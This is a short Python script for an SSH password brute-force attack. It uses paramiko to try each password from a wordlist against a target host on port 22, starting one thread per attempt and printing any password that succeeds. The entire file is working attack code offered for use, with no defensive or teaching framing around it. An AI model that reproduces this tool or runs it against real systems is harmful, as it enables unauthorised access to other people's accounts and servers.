import paramiko, os, termcolor
import threading, time

stop_flag = 0

def start_bruteforce(host, username, pass_file):
    if os.path.exists(pass_file) == False:
        print("[!!] The Password File/Path doesnot exists.")
        return
    
    def ssh_connect(password):
        global stop_flag
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            ssh.connect(host, port=22, username=username, password=password )
            stop_flag = 1 
            print(termcolor.colored((f"[+] Found password {password}, for account {username}"),"green"))
        except:
            print(termcolor.colored((f"[-] Incorrect password {password}"),"red"))
        ssh.close()

    with open(pass_file, 'r') as file:
        print("\n[+] Starting Bruteforce attack for SSH")
        for line in file.readlines():
            password = line.strip()
            if stop_flag == 1:
                t.join()
                break
            password = line.strip()
            t = threading.Thread(target=ssh_connect, args=(password,))
            t.start()
            time.sleep(0.5)
